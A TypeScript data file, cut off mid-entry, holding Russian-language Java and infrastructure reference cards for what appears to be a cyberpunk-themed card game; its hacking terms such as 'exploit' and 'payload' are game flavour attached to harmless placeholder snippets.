/**
 * Справочные данные для Энциклопедии Java.
 * Описывает концепции, примеры кода и цели использования.
 */

export interface JavaConcept {
  id: string;
  title: string;
  concept: string;
  explanation: string;
  example: string;
  purpose: string;
  bullets?: string[];
}

export const JAVA_REFERENCE: Record<string, JavaConcept> = {
  'syntax_package': {
    id: 'syntax_package',
    title: 'Директива package',
    concept: 'Namespace & Modular Structure',
    explanation:
      'Первая строка файла задаёт пространство имён. Пакеты предотвращают конфликты имён классов и определяют структуру каталогов проекта (например, com.company.module).',
    example: 'package com.neon.protocol;\n\npublic class Boot {\n}',
    purpose: 'Логическая группировка связанных классов и управление видимостью (package-private).',
    bullets: [
      'Соответствие: Имя пакета должно совпадать с иерархией папок.',
      'Уникальность: Рекомендуется использовать обратное доменное имя.',
      'Импорт: Классы из других пакетов требуют директивы import.',
      'Нижний регистр: По стандарту имена пакетов пишутся только строчными буквами.'
    ]
  },
  'syntax_class_decl': {
    id: 'syntax_class_decl',
    title: 'Объявление класса',
    concept: 'OOP Blueprint',
    explanation:
      'Класс — основной чертёж объекта. С точки зрения JVM, это структура данных в Metaspace, определяющая методы, поля и константы. В Java всё является частью класса, что обеспечивает строгую типизацию.',
    example: 'public class NeuralAgent {\n  private int integrity = 100;\n  public void scan() { ... }\n}',
    purpose: 'Организация кода через моделирование сущностей реального (или цифрового) мира.',
    bullets: [
      'ClassLoader: Процесс загрузки байт-кода класса в память JVM.',
      'Encapsulation: Сокрытие внутренней реализации за модификаторами private/protected.',
      'Inheritance: Иерархия типов (extends) для расширения функционала.',
      'Instantiation: Создание живых объектов в Heap-памяти через оператор new.',
      'Reflection: Возможность анализировать структуру класса прямо во время исполнения.'
    ]
  },
  'syntax_main_method': {
    id: 'syntax_main_method',
    title: 'Точка входа main',
    concept: 'JVM Bootstrap',
    explanation:
      'Специальный метод, с которого JVM начинает выполнение программы. При запуске создается основной поток исполнения (Main Thread). Без этого метода запуск автономного приложения невозможен.',
    example: 'public static void main(String[] args) {\n  System.out.println("SYSTEM_BOOT_OK");\n}',
    purpose: 'Первичная инициализация Runtime-среды и запуск системных процессов.',
    bullets: [
      'static: Метод принадлежит классу (вызывается до создания любых объектов).',
      'void: JVM не ожидает возврата данных от метода.',
      'args: Параметры командной строки для конфигурации агента "на лету".',
      'JVM Entry: Только один метод main может быть активной точкой входа в модуле.',
      'Exit Codes: Завершение метода без ошибок эквивалентно коду 0.'
    ]
  },
  'fn_sysout_print': {
    id: 'fn_sysout_print',
    title: 'Вывод в консоль',
    concept: 'Standard Output (stdout)',
    explanation:
      'Метод для вывода текстовых данных в стандартный поток (stdout). В OctoberLine используется для логов отладки и визуализации состояния Neural Bus в реальном времени.',
    example: 'System.out.println("PWR=" + currentPower);',
    purpose: 'Трассировка переменных и мониторинг состояния системы без отладчика.',
    bullets: [
      'println vs print: Автоматический перевод строки (\n).',
      'Standard Stream: Выводит данные в поток-дескриптор 1.',
      'Sync Lock: Метод синхронизирован. Слишком частый вывод может "зафризить" основной поток!',
      'Buffering: Данные уходят в системный буфер перед попаданием на экран.',
      'Pipe Redirect: Вывод может быть перенаправлен из консоли в файл или лог-сервер.'
    ]
  },
  'oop_constructor': {
    id: 'oop_constructor',
    title: 'Конструктор класса',
    concept: 'Object Initialization',
    explanation:
      'Блок кода, вызываемый при создании объекта (new). Имя конструктора должно точно совпадать с именем класса.',
    example: 'public NeuralAgent(int id) {\n  this.id = id;\n  this.online = true;\n}',
    purpose: 'Гарантировать, что объект рождается с корректными начальными данными.',
    bullets: [
      'No Return: Конструкторы не имеют возвращаемого типа (даже void).',
      'Overloading: В классе может быть много конструкторов с разными параметрами.',
      'Default: Если не написать ни одного, Java создаст пустой конструктор сама.',
      'this(): Вызов другого конструктора этого же класса из текущего.'
    ]
  },
  'syntax_method_decl': {
    id: 'syntax_method_decl',
    title: 'Метод экземпляра',
    concept: 'Object Behavior',
    explanation:
      'Функция, описанная внутри класса. Определяет, что объект может делать со своим состоянием.',
    example: 'public void damage(int value) {\n  this.hp -= value;\n}',
    purpose: 'Инкапсуляция действий и логики управления данными объекта.',
    bullets: [
      'this: Имеет доступ к текущему экземпляру через неявную ссылку.',
      'Signature: Уникальный набор из имени метода и типов его аргументов.',
      'Visibility: public, private или protected определяют доступ из других модулей.',
      'Stack: Вызов метода создает новый фрейм в стеке потока выполнения.'
    ]
  },
  'syntax_static_method': {
    id: 'syntax_static_method',
    title: 'Статический метод',
    concept: 'Pure Utility Functions',
    explanation:
      'Метод, принадлежащий самому классу. Не требует создания объекта для вызова. Часто используется для математических утилит.',
    example: 'public static int sum(int a, int b) { return a + b; }',
    purpose: 'Создание глобально доступных функций без побочных эффектов на состояние объектов.',
    bullets: [
      'No this: Статический метод не может обращаться к нестатическим полям (полям объектов).',
      'Memory: Хранится в специальной области памяти (Metaspace/Permanent Gen).',
      'Access: Вызывается по имени класса (Math.abs) вместо имени переменной.',
      'Efficiency: Экономит RAM, так как не привязан к конкретным экземплярам.'
    ]
  },
  'syntax_this_ref': {
    id: 'syntax_this_ref',
    title: 'Ссылка this',
    concept: 'Instance Self-Reference',
    explanation:
      'Ключевое слово, указывающее на «самого себя». Используется для разрешения конфликтов имен и передачи ссылки в другие методы.',
    example: 'public void setId(int id) {\n  this.id = id;\n}',
    purpose: 'Явное обращение к полям и методам текущего экземпляра.',
    bullets: [
      'Shadowing: Позволяет отличить локальную переменную (аргумент) от поля класса.',
      'Fluid API: Возврат `return this` позволяет строить цепочки вызовов (Builder).',
      'Constructors: Позволяет вызывать один конструктор из другого (`this(...)`).',
      'Scope: Доступно только внутри нестатических методов и конструкторов.'
    ]
  },
  'syntax_override': {
    id: 'syntax_override',
    title: 'Аннотация @Override',
    concept: 'Polymorphic Contract',
    explanation:
      'Маркер для компилятора, подтверждающий, что метод переопределяет метод родителя. Если сигнатуры не совпадут, программа не скомпилируется.',
    example: '@Override\npublic String toString() {\n  return "AGENT_V1";\n}',
    purpose: 'Предотвращение ошибок при рефакторинге и явное обозначение полиморфизма.',
    bullets: [
      'Compile-time check: Защищает от опечаток в именах или типах аргументов.',
      'Readable: Делает код понятнее, указывая на связь с базовым классом.',
      'Inheritance requirement: Метод должен существовать в родителе или интерфейсе.',
      'Safety: Гарантирует, что вы действительно меняете поведение, а не создаете новый метод.'
    ]
  },
  'oop_extends': {
    id: 'oop_extends',
    title: 'Наследование (extends)',
    concept: 'Class Inheritance',
    explanation:
      'Механизм создания нового класса на основе существующего. Потомок получает все поля и методы родителя.',
    example: 'class SecureAgent extends BaseAgent {\n  private int shieldIdx;\n}',
    purpose: 'Повторное использование кода и создание иерархий типов (IS-A).',
    bullets: [
      'Single Inheritance: В Java класс может иметь только одного прямого родителя.',
      'Subclassing: Возможность расширять функциональность без изменения оригинала.',
      'Reusability: Базовая логика пишется один раз в суперклассе.',
      'Visibility: private поля родителя недоступны напрямую, только через методы.'
    ]
  },
  'oop_super_call': {
    id: 'oop_super_call',
    title: 'Ключевое слово super',
    concept: 'Parent Access',
    explanation:
      'Ссылка на родительский объект. Позволяет вызвать реализацию метода или конструктор суперкласса.',
    example: '@Override\npublic void activate() {\n  super.activate();\n  log("EXTRA_SEC_OK");\n}',
    purpose: 'Дополнение (а не полная замена) логики родительского класса.',
    bullets: [
      'Constructors: `super(...)` должен быть ПЕРВОЙ строкой в конструкторе потомка.',
      'Methods: Позволяет обратиться к методу родителя, если он был переопределен в текущем классе.',
      'Fields: Позволяет дотянуться до полей родителя, если их имена совпадают с полями потомка.',
      'Hierarchy: Поднимает контекст выполнения на один уровень вверх по дереву наследования.'
    ]
  },
  'oop_interface': {
    id: 'oop_interface',
    title: 'Интерфейс (interface)',
    concept: 'Abstract Contract',
    explanation:
      'Чистый контракт: список методов, которые класс ОБЯЗАН реализовать. Не может содержать состояние (поля), только константы.',
    example: 'interface Hackable {\n  void injectPayload(byte[] data);\n}',
    purpose: 'Слабая связанность (Loosely Coupled) и поддержка множественного поведения.',
    bullets: [
      'Polymorphism: Позволяет обращаться к объекту через тип его интерфейса.',
      'Multiple: Один класс может реализовывать любое количество интерфейсов.',
      'Default methods: С Java 8 интерфейсы могут содержать базовую реализацию.',
      'Abstraction: Сокрытие деталей реализации за общим "пультом управления".'
    ]
  },
  'syntax_implements': {
    id: 'syntax_implements',
    title: 'Реализация (implements)',
    concept: 'Contract Fulfillment',
    explanation:
      'Ключевое слово, связывающее класс с интерфейсом. Компилятор заставит вас написать код для всех методов интерфейса.',
    example: 'public class SpyAgent implements Hackable {\n  public void injectPayload(...) { ... }\n}',
    purpose: 'Гарантия того, что объект поддерживает определенный протокол взаимодействия.',
    bullets: [
      'Full implementation: Должны быть реализованы ВСЕ методы, иначе класс будет абстрактным.',
      'Visibility: Методы интерфейса всегда public при реализации.',
      'Type-safety: Объект класса SpyAgent теперь официально является типом Hackable.',
      'Interoperability: Позволяет использовать объект в любых системах, знающих об этом интерфейсе.'
    ]
  },
  'fn_socket': {
    id: 'fn_socket',
    title: 'Сокет TCP (Socket)',
    concept: 'Low-level Networking',
    explanation:
      'Программный интерфейс (точка подключения) для передачи байтов между двумя узлами по сети (TCP/IP).',
    example: 'try (Socket s = new Socket("neon-city", 80)) {\n  OutputStream out = s.getOutputStream();\n}',
    purpose: 'Обеспечение двусторонней связи (Full-duplex) между сервисами.',
    bullets: [
      'TCP: Гарантирует доставку пакетов в правильном порядке.',
      'Streams: Данные передаются через InputStream и OutputStream.',
      'Blocking: По умолчанию операция ввода-вывода ждет ответа и "замораживает" поток.',
      'Cleanup: Сокеты обязательно нужно закрывать, чтобы не утекали файловые дескрипторы.'
    ]
  },
  'syntax_if': {
    id: 'syntax_if',
    title: 'Условный переход (if)',
    concept: 'Flow Control: decision',
    explanation: 'Основная развилка в коде. Выполняет блок данных только если логическое условие внутри скобок истинно.',
    example: 'if (pwr > 80) { deployHeavyModule(); }',
    purpose: 'Принятие логических решений на основе текущего состояния системы.',
    bullets: [
      'Boolean expression: Внутри скобок всегда должно быть значение true или false.',
      'Branching: Создает альтернативный путь выполнения процесса.',
      'Nesting: Один if может находиться внутри другого, создавая сложные деревья логики.',
      'Efficiency: Самые вероятные условия стоит проверять первыми.'
    ]
  },
  'syntax_elseif': {
    id: 'syntax_elseif',
    title: 'Альтернативная ветка (else if)',
    concept: 'Conditional Chain',
    explanation: 'Позволяет проверить дополнительное условие, если предыдущее было ложным. Формирует цепочку принятия решений.',
    example: 'if (hp < 20) {\n  repair();\n} else if (hp < 50) {\n  warning();\n}',
    purpose: 'Сложное ветвление логики без избыточной вложенности блоков.',
    bullets: [
      'Эксклюзивность: Выполнится только ОДИН блок в цепочке (первый истинный).',
      'Short-circuit: После первого успешного выполнения остальные else if игнорируются.',
      'Default: В конце цепочки может стоять финальный else для всех остальных случаев.',
      'Order: Важно располагать условия от более специфичных к более общим.'
    ]
  },
  'syntax_for_loop': {
    id: 'syntax_for_loop',
    title: 'Цикл со счетчиком (for)',
    concept: 'Iteration control',
    explanation: 'Классический цикл для повторения действий заданное количество раз. Использует счетчик, условие выхода и шаг.',
    example: 'for (int i = 0; i < 5; i++) { scanNode(i); }',
    purpose: 'Массовая обработка данных с известным пределом повторений.',
    bullets: [
      'Init: Первая часть выполняется один раз при входе.',
      'Condition: Проверяется перед каждой итерацией.',
      'Increment: Выполняется в самом конце каждого круга.',
      'Arrays: Самый удобный способ перебора элементов массива по индексу.'
    ]
  },
  'syntax_try_catch': {
    id: 'syntax_try_catch',
    title: 'Обработка ошибок (try-catch)',
    concept: 'Exception Handling',
    explanation: 'Механизм "ловли" сбоев. Если в блоке try случится ошибка, программа не упадет, а перейдет в блок catch.',
    example: 'try {\n  network.send();\n} catch (IOException e) {\n  reconnect();\n}',
    purpose: 'Создание отказоустойчивых систем, способных выживать при сбоях сети или памяти.',
    bullets: [
      'Stability: Предотвращает аварийное завершение процесса.',
      'Logging: В блоке catch обычно фиксируется причина сбоя (StackTrace).',
      'Finally: Дополнительный блок, который выполнится в любом случае (даже при ошибке).',
      'Types: Можно ловить конкретные ошибки (SQLException) или общую (Exception).'
    ]
  },
  'lib_collections': {
    id: 'lib_collections',
    title: 'Фреймворк Коллекций',
    concept: 'Standard Data Containers',
    explanation: 'Набор готовых структур данных (списки, множества, очереди) для хранения групп объектов любых типов.',
    example: 'import java.util.*;\nList<Module> m = new ArrayList<>();',
    purpose: 'Стандартизация работы с данными и экономия времени на написание базовых алгоритмов.',
    bullets: [
      'Interfaces: Основные типы — List (список), Set (множество), Map (словарь).',
      'Utilities: Содержит готовые методы для сортировки, поиска и перемешивания.',
      'Memory efficiency: Каждая коллекция оптимизирована под конкретные задачи.',
      'Iteration: Поддерживает универсальный способ перебора через Iterator или For-each.'
    ]
  },
  'syntax_list_init': {
    id: 'syntax_list_init',
    title: 'Инициализация списка (ArrayList)',
    concept: 'Dynamic Array Structure',
    explanation: 'ArrayList — реализация интерфейса List на базе обычного массива. Автоматически расширяется при достижении предела емкости.',
    example: 'List<String> deck = new ArrayList<>();\ndeck.add("IF_CONDITION");',
    purpose: 'Эффективный случайный доступ к элементам по индексу (O(1)).',
    bullets: [
      'Generics: Синтаксис <String> гарантирует типобезопасность контейнера.',
      'Capacity: При заполнении массив пересоздается с размером x1.5.',
      'Ordering: Сохраняет порядок вставки элементов.',
      'Null: Допускает хранение null-значений.'
    ]
  },
  'fn_map_put': {
    id: 'fn_map_put',
    title: 'Ассоциативный массив (Map)',
    concept: 'Key-Value Mapping',
    explanation: 'Map позволяет связывать уникальный ключ с конкретным значением. HashMap — самая быстрая реализация на базе хэш-таблицы.',
    example: 'Map<String, Integer> inventory = new HashMap<>();\ninventory.put("Credits", 150);',
    purpose: 'Мгновенный поиск данных (O(1)) по уникальному идентификатору.',
    bullets: [
      'Uniqueness: Ключи не могут дублироваться (старое значение удалится).',
      'Hashing: Работает через hashCode() и equals() для поиска корзины.',
      'Collision: При совпадении хэшей элементы выстраиваются в связный список или дерево.',
      'Entry: Пара "ключ-значение" представлена объектом Map.Entry.'
    ]
  },
  'lib_network': {
    id: 'lib_network',
    title: 'Библиотека java.net',
    concept: 'Networking Stack',
    explanation: 'Набор классов для работы с IP, URL, TCP и UDP протоколами прямо из Java.',
    example: 'URL api = new URL("https://neon.center/v1");',
    purpose: 'Обеспечение связи между кибер-имплантами и удаленными серверами управления.',
    bullets: [
      'InetAddress: Работа с IP-адресами и доменными именами.',
      'URLs: Работа с высокоуровневыми ресурсами интернета.',
      'Sockets: Низкоуровневые байтовые потоки.',
      'Timeouts: Возможность ограничить время ожидания сетевого ответа.'
    ]
  },
  'fn_ping': {
    id: 'fn_ping',
    title: 'Проверка доступности (Ping)',
    concept: 'Connectivity Check',
    explanation: 'Быстрый запрос к удаленному узлу для проверки его работоспособности без обмена тяжелыми данными.',
    example: 'boolean alive = InetAddress.getByName(ip).isReachable(500);',
    purpose: 'Диагностика сети и выбор живых целей перед атакой.',
    bullets: [
      'Latency: Время ответа (RTT) говорит о нагрузке на канал.',
      'ICMP/TCP: Может использовать разные протоколы для проверки (базово ICMP).',
      'Timeout: Критически важный параметр, чтобы не ждать "зависший" узел долго.',
      'Diagnostic: Первый шаг при любом сбое связи.'
    ]
  },
  'fn_exploit': {
    id: 'fn_exploit',
    title: 'Эксплуатация (Exploit)',
    concept: 'Logic Invalidation',
    explanation: 'Использование дыр в реализации протоколов противника. В игре — мощный ход, наносящий критический урон прогрессу ИИ.',
    example: '// execute payload on broken buffer\nif (buffer.leak()) pwn_node();',
    purpose: 'Быстрое завершение миссии за счет использования слабых мест вражеской архитектуры.',
    bullets: [
      'Research: Требует предварительного сканирования (Reference Info).',
      'Criticality: Наносит урон напрямую в "ядро" (Core Integrity) врага.',
      'Unpredictability: Трудно заблокировать обычными антивирусами.',
      'Resource-heavy: Часто требует много CPU для подготовки полезной нагрузки.'
    ]
  },
  'soft_focus': {
    id: 'soft_focus',
    title: 'Концентрация (Focus)',
    concept: 'Focus Restoration',
    explanation: 'Ментальная передышка агента. Не тратит ресурсы CPU, позволяя восстановить фокус и подготовить следующие действия.',
    example: '// Clear mind, watch data spikes\n',
    purpose: 'Сглаживание распределения ресурсов в затяжной схватке.',
    bullets: [
      'Zero-Cost: Единственная карта, не требующая CPU.',
      'Cycle: Помогает пропустить ход без штрафов, добирая нужные инструменты.',
      'Synergy: Эффективно работает с картами добора (Draw).',
      'Tactical: Позволяет переждать опасную фазу атаки противника.'
    ]
  },
  'mid_stream_init': {
    id: 'mid_stream_init',
    title: 'Инциализация Stream API',
    concept: 'Declarative Data Pipeline',
    explanation: 'Переход от циклов к функциональному стилю. Позволяет описывать цепочки трансформации данных без промежуточных переменных.',
    example: 'list.stream().filter(s -> s.startsWith("A"))...',
    purpose: 'Повышение читаемости и уменьшение вероятности ошибок "на единицу" в циклах.',
    bullets: [
      'Lazy loading: Стрим не обрабатывает данные, пока не вызвана финальная команда (.collect).',
      'Immutability: Оригинальная коллекция остается нетронутой.',
      'Functional interfaces: Использует лямбда-выражения (Predicate, Function).',
      'Optimization: JVM может автоматически оптимизировать длинные цепочки вызовов.'
    ]
  },
  'mid_stream_map': {
    id: 'mid_stream_map',
    title: 'Функция Stream::map',
    concept: 'Element Transformation',
    explanation: 'Промежуточная операция трансформации. Преобразует каждый объект в потоке в другой объект по заданному правилу. Это фундамент функционального программирования в Java.',
    example: '.map(user -> user.getId()).collect(Collectors.toList());',
    purpose: 'Массовое преобразование данных (Projecting) без изменения исходной коллекции.',
    bullets: [
      'Function Interface: Принимает лямбда-выражение типа java.util.function.Function.',
      'Stateless: Каждый элемент обрабатывается независимо от соседа.',
      'Pipeline Fusion: JVM может объединить несколько .map() в один проход по памяти.',
      'Type-Safe: Компилятор проверит соответствие типов входных и выходных данных.',
      'O(N): Сложность обработки — линейная, зависит только от количества элементов.'
    ]
  },
  'mid_optional': {
    id: 'mid_optional',
    title: 'Контейнер Optional',
    concept: 'Null-safety Wrapper',
    explanation: 'Специальная обертка для значения, которое может быть null. Заставляет разработчика явно обрабатывать случай отсутствия данных.',
    example: 'Optional.ofNullable(agent).ifPresent(a -> a.wakeUp());',
    purpose: 'Полное искоренение Runtime-ошибок типа NullPointerException (NPE).',
    bullets: [
      'Safety: Предотвращает падение программы при пустых данных.',
      'Declarative: Предлагает методы orElse, orElseGet для дефолтных значений.',
      'Chain: Можно комбинировать с методами filter и map внутри самого Optional.',
      'Best practice: Хороший тон в современном Java — возвращать Optional из методов поиска.'
    ]
  },
  'mid_future': {
    id: 'mid_future',
    title: 'Асинхронный Future',
    concept: 'Async Task Result',
    explanation: 'Обещание результата вычисления, которое происходит в другом потоке. Позволяет системе не ждать долгой сетевой операции.',
    example: 'CompletableFuture.supplyAsync(() -> fetchNetData()).thenAccept(...)',
    purpose: 'Обеспечение отзывчивости интерфейса (HUD) при тяжелых вычислениях в фоне.',
    bullets: [
      'Concurrency: Позволяет использовать все ядра CPU одновременно.',
      'Non-blocking: Основной поток (Main) остается свободным для действий игрока.',
      'Callbacks: Возможность задать действия сразу после того, как "будущее" наступит.',
      'Exception: Поддерживает отдельную логику для обработки ошибок в асинхронном потоке.'
    ]
  },
  'def_validator': {
    id: 'def_validator',
    title: 'Валидатор данных',
    concept: 'Integrity Guardian',
    explanation: 'Модуль проверки корректности входных параметров. Отражает атаки на основе мусорных или вредоносных данных.',
    example: 'Assert.notNull(id); Assert.hasText(name);',
    purpose: 'Защита внутренней логики от некорректных состояний (Data Corruption).',
    bullets: [
      'Pre-check: Выполняется в самом начале метода.',
      'Error Early: Кидает исключение сразу, не допуская распространения ошибки.',
      'Contract: Четко описывает, какие данные программа согласна обрабатывать.',
      'Performance: Незначительные затраты CPU сейчас спасают от тяжелых багов потом.'
    ]
  },
  'infra_cicd': {
    id: 'infra_cicd',
    title: 'CI/CD Конвейер',
    concept: 'Automation Pipeline',
    explanation: 'Автоматизированный процесс доставки кода: сборка -> тест -> деплой. Ускоряет релизы в разы.',
    example: 'jobs: build -> test -> deploy_to_prod',
    purpose: 'Минимизация ручного труда и человеческого фактора при выпуске обновлений.',
    bullets: [
      'Continuous Integration: Код всех разработчиков сливается и проверяется постоянно.',
      'Continuous Delivery: Готовый артефакт (JAR) создается на каждый пуш.',
      'Quality Gates: Сборка упадет, если тесты не пройдены (у игрока снижается Bug Count).',
      'Velocity: Позволяет разворачивать новую инфраструктуру (CPU) быстрее.'
    ]
  },
  'infra_redis': {
    id: 'infra_redis',
    title: 'Кэш Redis',
    concept: 'In-Memory Speedster',
    explanation: 'Сверхбыстрая база данных в оперативной памяти. Используется для хранения результатов, за которыми долго ходить в основную БД.',
    example: 'redis.set("player_hp", 100);',
    purpose: 'Мгновенное ускорение доступа к наиболее важным параметрам системы.',
    bullets: [
      'Sub-millisecond: Скорость доступа к данным практически мгновенная.',
      'Throughput: Выдерживает колоссальное количество запросов в секунду.',
      'Key-Value: Простая и надежная структура хранения.',
      'Volatile: Данные могут стереться при выключении (нужен для быстрых бонусов/Draw).'
    ]
  },
  'infra_basic_pod': {
    id: 'infra_basic_pod',
    title: 'Инфраструктурный Под',
    concept: 'Kubernetes Unit',
    explanation: 'Минимальный кирпичик вашей инфраструктуры. Содержит контейнеры с кодом. База для любого расширения ресурсов.',
    example: 'kubectl apply -f simple-pod.yaml',
    purpose: 'Предоставление минимальных вычислительных мощностей (CPU) для запуска карт.',
    bullets: [
      'Atomic: Под либо запущен, либо нет.',
      'Ephemeral: Может быть легко пересоздан при сбое или атаке ИИ.',
      'Isolated: Имеет свой IP и ресурсы, не мешая другим модулям.',
      'Scalable: Можно запустить сотни таких подов для огромной мощи.'
    ]
  },
  'infra_h_scaling': {
    id: 'infra_h_scaling',
    title: 'Горизонтальное масштабирование',
    concept: 'Cluster Multiplication',
    explanation: 'Запуск копий вашего приложения на разных узлах. Если одно ядро не справляется, мы просто добавляем еще 5 таких же.',
    example: 'replicas: 10 // increase compute throughput',
    purpose: 'Обработка пиковых нагрузок и обеспечение выживаемости (High Availability).',
    bullets: [
      'Load Balancing: Трафик делится поровну между всеми узлами.',
      'Redundancy: Смерть одного узла незаметна для системы в целом.',
      'Dynamic: Можно добавлять и убирать узлы прямо во время боя.',
      'Elasticity: Система сжимается и расширяется под нужды проекта.'
    ]
  },
  'react_unit_test': {
    id: 'react_unit_test',
    title: 'Модульные тесты (JUnit)',
    concept: 'Isolation Verification',
    explanation: 'Проверка маленьких кусочков кода на корректность. Гарантирует, что 2+2 всегда равно 4, несмотря ни на что.',
    example: '@Test void check() { assertEquals(10, agent.hit()); }',
    purpose: 'Гарантия стабильности и возможность рефакторинга без страха всё сломать.',
    bullets: [
      'Fast: Выполняются за миллисекунды.',
      'Independent: Один тест не должен зависеть от результатов другого.',
      'Bugs: Первая линия обороны против багов (Bug Points).',
      'Documentation: Тесты сами по себе являются лучшей справкой "как это должно работать".'
    ]
  },
  'react_refactoring': {
    id: 'react_refactoring',
    title: 'Рефакторинг кода',
    concept: 'Complexity Reduction',
    explanation: 'Уборка внутри кодовой базы. Делает код понятнее и проще, не меняя его поведение для пользователя.',
    example: '// rename confusing variables',
    purpose: 'Снижение технического долга и когнитивной нагрузки (Stress) на разработчика.',
    bullets: [
      'Readability: Упрощает поддержку кода в будущем.',
      'Performance: Иногда позволяет найти и убрать узкие места.',
      'Mental Health: Чистый код снижает уровень стресса при работе.',
      'Flexibility: Делает архитектуру более готовой к новым фичам.'
    ]
  },
  'soft_pair_programming': {
    id: 'soft_pair_programming',
    title: 'Парное программирование',
    concept: 'Social Code Review',
    explanation: 'Двое разработчиков у одного монитора. "Штурман" смотрит на архитектуру, "Пилот" пишет код. Вдвое меньше багов.',
    example: '// Two brains, one keyboard',
    purpose: 'Быстрая передача знаний и радикальное повышение качества выпускаемого кода.',
    bullets: [
      'Knowledge transfer: Обучение происходит в реальном времени.',
      'Quality: Ошибки замечаются ПЕРЕД тем, как попасть в репозиторий.',
      'Moral support: Позволяет не пасовать перед сложными задачами.',
      'Efficiency: Суммарное время на фичу часто меньше за счет чистоты кода.'
    ]
  },
  'react_integration_test': {
    id: 'react_integration_test',
    title: 'Интеграционные тесты',
    concept: 'System Flow Validation',
    explanation: 'Проверка связи между модулями. Работает ли наш сервис с настоящей БД? Код с сетью?',
    example: '@SpringBootTest class IntTest { ... }',
    purpose: 'Поиск ошибок на стыках систем, которые не видны в юнит-тестах.',
    bullets: [
      'Real world: Использует реальные зависимости (базы, очереди).',
      'Confidence: Дает гарантию, что всё приложение целиком готово к деплою.',
      'Infrastructure: Может требовать поднятия тестовых контейнеров (Docker).',
      'End-to-End: Проверяет цепочку от HTTP-входа до записи в файл.'
    ]
  },
  'soft_buffer_flush': {
    id: 'soft_buffer_flush',
    title: 'Сброс буфера (Flush)',
    concept: 'Hand Reset Command',
    explanation: 'Мгновенная очистка текущего набора задач (руки карт) для получения новых инструментов. Экстренное переключение контекста.',
    example: 'buff.flush(); // redraw all slots',
    purpose: 'Выход из ситуации, когда текущие карты бесполезны против врага.',
    bullets: [
      'Tactical: Дает шанс вытянуть спасительный Hotfix или Shield.',
      'Opportunity cost: Вы тратите драгоценный ход на сброс, но получаете преимущество.',
      'Empty hand: Позволяет избавиться от "мусора" и накопленных дебаффов.',
      'Reset: Полное обновление планов разработки.'
    ]
  },
  'soft_recursive_logic': {
    id: 'soft_recursive_logic',
    title: 'Рекурсивная логика',
    concept: 'Algorithmic Self-Call',
    explanation: 'Способность алгоритма вызывать самого себя. Чрезвычайно мощная техника для обработки древовидных структур.',
    example: 'void run() { if(done) return; run(); }',
    purpose: 'Решение сложных вложенных задач элегантным и коротким кодом.',
    bullets: [
      'Divide & Conquer: Разбивает задачу на подзадачи того же типа.',
      'Base Case: Всегда должно быть условие выхода, иначе система "упадет" (StackOverflow).',
      'Depth: В игре дает бесконечный потенциал прогресса при правильном использовании.',
      'Memory: Каждый уровень рекурсии занимает место в стеке RAM.'
    ]
  },
  'soft_async_request': {
    id: 'soft_async_request',
    title: 'Асинхронные запросы',
    concept: 'Non-blocking I/O Stream',
    explanation: 'Отправка задачи в фон. Пока данные летят по сети, наше ядро (CPU) свободно и может делать другую работу.',
    example: 'http.sendAsync(...)',
    purpose: 'Максимальная эффективность использования CPU за счет параллелизма.',
    bullets: [
      'Throughput: Позволяет обрабатывать тысячи запросов одновременно.',
      'Wait-free: Приложение не "фризит" в ожидании ответа.',
      'Optimization: Идеально для карт INFRA и микросервисов.',
      'Resource saving: Следующая карта в ходу может стоить меньше CPU.'
    ]
  },
  'infra_docker': {
    id: 'infra_docker',
    title: 'Контейнеры Docker',
    concept: 'OS-level Virtualization',
    explanation: 'Технология контейнеризации на уровне ОС. Упаковывает приложение со всем окружением в изолированный имидж. Docker использует ядро хост-системы, но изолирует процессы через namespaces и cgroups.',
    example: 'docker build -t neon-app .',
    purpose: 'Гарантия идентичности среды исполнения (Dev = Prod). Открывает слоты RAM.',
    bullets: [
      'Layered FS: Имиджи состоят из слоев, которые кэшируются для ускорения билда.',
      'Isolation: Процессы внутри контейнера не имеют доступа к основной системе.',
      'Resource Limits: Ограничение CPU и RAM для предотвращения утечек "соседями".',
      'Daemon: Управление жизненным циклом контейнеров (Start/Stop/Kill).',
      'Registry: Централизованное хранилище готовых модулей (Docker Hub).'
    ]
  },
  'infra_postgres': {
    id: 'infra_postgres',
    title: 'БД PostgreSQL',
    concept: 'Object-Relational DBMS',
    explanation: 'Мощная объектно-реляционная СУБД. Поддерживает ACID (Атомарность, Согласованность, Изоляция, Долговечность) на высшем уровне архитектуры.',
    example: 'SELECT * FROM secrets WHERE level > 9;',
    purpose: 'Надежное персистентное хранение критических данных. База для Senior-модулей.',
    bullets: [
      'WAL (Write-Ahead Logging): Гарантирует сохранность данных даже при сбое питания.',
      'MVCC: Чтение данных не блокирует запись, и наоборот. Высокий параллелизм.',
      'JSONB: Поволяет хранить неструктурированные данные с эффективным поиском.',
      'Indexing: B-Tree, GIN и GiST индексы для мгновенной выборки данных.',
      'Extensions: Поддержка PostGIS (гео-данные) и полнотекстового поиска.'
    ]
  },
  'infra_s3_bucket': {
    id: 'infra_s3_bucket',
    title: 'Хранилище S3',
    concept: 'Massive Object Store',
    explanation: 'Бесконечное облако для файлов любого размера. В OctoberLine выступает как огромный расширитель виртуальной памяти.',
    example: 's3.upload("large_binary_exploit.db");',
    purpose: 'Хранение огромных объемов данных без нагрузки на локальный сервер.',
    bullets: [
      'Availability: Данные доступны из любой точки сети.',
      'Scalability: Хранилище растет само вместе с объемом ваших данных.',
      'Durable: Почти нулевой шанс потери данных за счет многократного дублирования.',
      'RAM Boost: Дает самый большой прирост слотов в игре (+3 слота).'
    ]
  },
  'infra_prometheus': {
    id: 'infra_prometheus',
    title: 'Система Prometheus',
    concept: 'Time-series Telemetry',
    explanation: 'Датчик пульса всей вашей инфраструктуры. Собирает метрики каждые несколько секунд и строит по ним графики.',
    example: 'up == 1 // check if targets are alive',
    purpose: 'Обнаружение аномалий и предугадывание векторов атаки противника.',
    bullets: [
      'Scraping: Сама ходит по узлам и опрашивает их состояние.',
      'Alerting: Подает сигнал тревоги, если CPU или RAM на пределе.',
      'Querying (PromQL): Позволяет делать мощные срезы по истории данных.',
      'Vision: В игре позволяет видеть характеристики карт противника.'
    ]
  },
  'status_spaghetti': {
    id: 'status_spaghetti',
    title: 'Спагетти-код (Spaghetti)',
    concept: 'Negative Complexity',
    explanation: 'Бессистемный и запутанный код, где всё зависит от всего. Главный враг чистоты и скорости разработки.',
    example: 'goto label_1; // confusing logic',
    purpose: 'Дебафф: символизирует плохую организацию процесса, занимая место в памяти.',
    bullets: [
      'Debt: Считается формой технического долга.',
      'Stress: Затрудняет понимание системы коллегами (и вами через неделю).',
      'Bugs: В таком коде ошибки плодятся сами собой.',
      'Maintenance: Требует удаления через карту Refactoring как можно скорее.'
